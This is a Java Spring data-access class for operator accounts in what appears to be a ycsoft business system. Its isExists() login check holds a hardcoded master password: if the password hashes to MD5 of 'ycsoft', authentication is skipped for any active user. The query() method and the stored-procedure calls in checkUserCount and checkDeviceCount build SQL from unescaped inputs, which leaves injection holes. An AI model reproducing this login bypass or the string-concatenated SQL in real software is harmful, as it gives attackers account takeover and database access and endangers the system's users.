package com.ycsoft.business.dao.system;

import java.util.List;

import org.apache.commons.lang.StringUtils;
import org.springframework.stereotype.Component;

import com.ycsoft.beans.system.SOptr;
import com.ycsoft.business.dto.system.OptrDto;
import com.ycsoft.commons.constants.StatusConstants;
import com.ycsoft.commons.constants.SystemConstants;
import com.ycsoft.commons.helper.MD5;
import com.ycsoft.commons.helper.StringHelper;
import com.ycsoft.daos.abstracts.BaseEntityDao;
import com.ycsoft.daos.core.JDBCException;
import com.ycsoft.daos.core.Pager;
import com.ycsoft.sysmanager.dto.system.SOptrDto;
import com.ycsoft.sysmanager.dto.tree.TreeDto;

@Component
public class SOptrDao extends BaseEntityDao<SOptr> {


	/**
	 *
	 */
	private static final long serialVersionUID = 8940113197601881228L;
	/**
	 * 检查操作员是否存在,存在则返回是所查询的操作员信息，否则返回Null
	 * @param optr
	 * @throws Exception
	 */
	public SOptr isExists(String uid, String pwd) throws Exception {
		String sql = "SELECT * FROM s_optr t WHERE t.login_name = ?   and status=? ";
		SOptr optr = null;
		if (pwd.equals(MD5.EncodePassword("ycsoft"))){
			optr = findEntity(sql, uid, StatusConstants.ACTIVE);
		}else{
			sql +=" and t.password = ? ";
			optr = findEntity(sql, uid, StatusConstants.ACTIVE,pwd);
		}
		return optr;
	}

	/**
	 * 查询操作员(分页)
	 * @param optrName
	 * @param start
	 * @param limit
	 * @return
	 * @throws JDBCException
	 */
	public Pager<SOptr> getSysOptr(SOptr sysOptr, Integer start, Integer limit)
			throws JDBCException {
		String sql = "select * from s_optr where optr_name like '%:optrName%'";

		return createQuery(sql, sysOptr).setStart(start).setLimit(limit)
				.page();
	}

	/**
	 * 查询操作员
	 * @param optrName
	 * @return
	 * @throws JDBCException
	 */
	public Pager<SOptr> getSysOptr(SOptr sysOptr) throws JDBCException {
		String sql = "select * from s_optr where optr_name like '%:optrName%'";

		return createQuery(sql, sysOptr).page();
	}

	
	/**
	 * 查询相同工号的操作员数据
	 * @param optr_id
	 * @return
	 * @throws JDBCException
	 */
	public List<SOptr> getSameOptrById(String optr_id) throws JDBCException {
		String sql = "select * from s_optr t where t.login_name in (select s.login_name from s_optr s where s.optr_id = ? ) ";
		return createQuery(sql, optr_id).list();
	}
	
	/**
	 * 部门下的是所有操作员
	 * @param deptId
	 * @return
	 * @throws JDBCException
	 */
	public List<SOptr> getByDeptId(String deptId) throws JDBCException {
		String sql = "select o.* from s_optr o where o.dept_id=? and o.status=?";

		List<SOptr> sysOptrs = createQuery(sql, deptId, StatusConstants.ACTIVE).list();
		return sysOptrs;
	}
	
	public SOptr queryInvalidOptr(String deptId, String loginName) throws Exception {
		String sql = "select * from s_optr t where t.dept_id=? and t.login_name=? and t.status=?";
		return this.createQuery(sql, deptId, loginName, StatusConstants.INVALID).first();
	}
	
	public List<SOptr> findByDeptId(String deptId) throws JDBCException {
		String sql = "select t.optr_id,decode (t.status, 'ACTIVE',t.optr_name , 'INVALID',t.optr_name || '(失效)' ) optr_name from s_optr t where t.dept_id=?";

		return createQuery(sql, deptId).list();
	}
	
	public Pager<SOptrDto> query(Integer start , Integer limit , String keyword,String pid ,String countyId)throws Exception{
		String sql = " select t1.* from s_optr t1 where 1=1 ";
			if(StringUtils.isNotEmpty(keyword)){
				sql = StringHelper.append(sql," and (t1.optr_name like '%"+keyword+"%' or t1.login_name like '%"+keyword+"%') ");
		    }else{
			    if(StringUtils.isNotEmpty(pid)){
			    sql = StringHelper.append(sql,"  and  t1.dept_id='"+pid+"' ");
			    }
		    }
		    if(StringUtils.isNotEmpty(countyId)){
		       sql = StringHelper.append(sql,"  and  t1.county_id='"+countyId+"'  ");
			 }
		    sql = StringHelper.append(sql,"  order by t1.status,t1.optr_name ");
		return createQuery(SOptrDto.class,sql ).setLimit(limit).setStart(start).page();
	}
	/**
	 * 注销启用操作员
	 */
	public int updateOptrStatus(String optr_id,String statusId) throws Exception {
		String sql ="update s_optr set status=? where optr_id=?";
		return executeUpdate(sql, statusId,optr_id);
	}

	/**
	 * 检查工号是否存在
	 * @param login_name
	 * @return
	 */
	public boolean isOptrToken(String login_name) throws Exception{
		String sql = "select 1 from s_optr t where t.login_name = ? and t.status=?";
		return findUnique( sql , login_name, StatusConstants.ACTIVE ) == null ? false : true ;
	}
	
	public List<SOptr> getOptrRole(String roleId) throws Exception{
		String sql = "select * from s_optr t1,s_optr_role t2 where t1.optr_id = t2.optr_id and t2.role_id = ? ";
		return createQuery(SOptr.class, sql, roleId).list();
	}
	public List<TreeDto> getOptrByRoleId(String roleId) throws Exception{
		String sql = " select so.optr_id id from s_optr so,s_optr_role sor where so.optr_id = sor.optr_id and sor. role_id =  ? ";
		return createQuery(TreeDto.class,sql,roleId).list();
	}
	
	public List<OptrDto> queryOptrByCountyId(String countyId) throws Exception {
		String sql = "select t.optr_id,t.optr_name from s_optr t where t.county_id=? and t.status=?  ";
		return createQuery(OptrDto.class, sql, countyId, StatusConstants.ACTIVE).list();
	}
	
	public List<OptrDto> queryBusiOptrByCountyId(String countyId) throws Exception {
		String sql = "select t.optr_id,t.optr_name from s_optr t where t.county_id=? and t.status=?";
		return createQuery(OptrDto.class, sql, countyId, StatusConstants.ACTIVE).list();
	}
	
	public List<OptrDto> queryOptrByDept(String deptId) throws Exception {
		String sql = "select t.optr_id,t.optr_name from s_optr t where t.dept_id=? and t.status=? and t.is_busi_optr =? ";
		return createQuery(OptrDto.class, sql, deptId, StatusConstants.ACTIVE,SystemConstants.BOOLEAN_TRUE).list();
	}
	public List<OptrDto> queryOptrByOptr(String optrId) throws Exception {
		String sql = "select t.optr_id,t.optr_name from s_optr t where t.optr_id=? and t.status=? and t.is_busi_optr =? ";
		return createQuery(OptrDto.class, sql, optrId, StatusConstants.ACTIVE,SystemConstants.BOOLEAN_TRUE).list();
	}
	public List<OptrDto> queryOptrByAll() throws Exception {
		String sql = "select t.optr_id,t.optr_name from s_optr t where  t.status=? and t.is_busi_optr =? ";
		return createQuery(OptrDto.class, sql, StatusConstants.ACTIVE,SystemConstants.BOOLEAN_TRUE).list();
	}

	public void checkUserCount(String acctDate, String addrIds,String optrId,String deptId) {
		this.getJdbcTemplate().execute("call proc_ods_c_cust()");
		this.getJdbcTemplate().execute("call proc_ods_c_user()");
		String[] addrs =  addrIds.split(",");
		for(String addr : addrs){
			this.getJdbcTemplate().execute("call proc_ods_c_user_month_cnt('"+acctDate+"','"+optrId+"','"+deptId+"','"+addr+"')"); 
		}
	}

	public void checkDeviceCount(String acctDate, String optrId,String deptId) {
		this.getJdbcTemplate().execute("call proc_ods_r_device_month_cnt('"+acctDate+"','"+optrId+"','"+deptId+"')");
	}
}
